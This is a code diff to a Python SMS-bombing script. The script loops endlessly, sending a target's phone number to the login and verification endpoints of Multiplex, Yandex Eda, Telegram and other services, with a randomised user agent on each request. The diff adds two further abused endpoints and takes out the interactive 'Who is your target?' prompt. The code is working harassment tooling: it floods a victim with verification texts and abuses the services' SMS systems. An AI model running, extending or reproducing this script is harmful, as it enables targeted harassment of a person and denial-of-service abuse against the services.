@@ -1,7 +1,6 @@
 from user_agent import generate_user_agent
 import threading
 import requests
-import random
 
 print(r"""
     __    ____   __    __  __  __ __  __ _   __ ______ ______ ____  _____
@@ -12,24 +11,16 @@ print(r"""
                                                                                               
 
 """)
-print('Who is your target? Type here: ')
-phone = input()
-phone_full = '38' + phone
-phone_plus = '+' + phone_full
+#print('Who is your target? Type here: ')
+#phone = input()
+phone = ''
+phone_plus = '+' + phone
 
 def run():
 	while True:
 		head = {'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
-		'''russian_name = ''
-		password = ''
-		name = ''
-		for i in range(12):
-			russian_name = russian_name + random.choice(list('йцукенгшщзхъфывапролджэячсмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ'))
-			password = password + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-			name = name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-		email = name + '@gmail.com' '''
-
-		response = requests.post('https://auth.multiplex.ua/login', json = {'login': phone_full}, headers = head)
+		
+		response = requests.post('https://auth.multiplex.ua/login', json = {'login': phone}, headers = head)
 		print('Multiplex: ' + str(response.text))
 		
 		response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': phone_plus}, headers = head)
@@ -40,5 +31,11 @@ def run():
 
 		response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': phone_plus}, headers = head)
 		print('Telegram: ' + str(response.text))
+
+		response = requests.post('https://taxovichkof.ru/api/userSendSms', data = {'username': phone_plus, 'lang': 'ru', 'city': 'spb'}, headers = head)
+		print('Taxovichkof: ' + str(response.text))
+
+		response = requests.post('https://my.xtra.tv/api/signup?lang=uk', data = {'phone': phone_plus}, headers = head)
+		print('XTRA TV: ' + str(response.text))
 
 run()
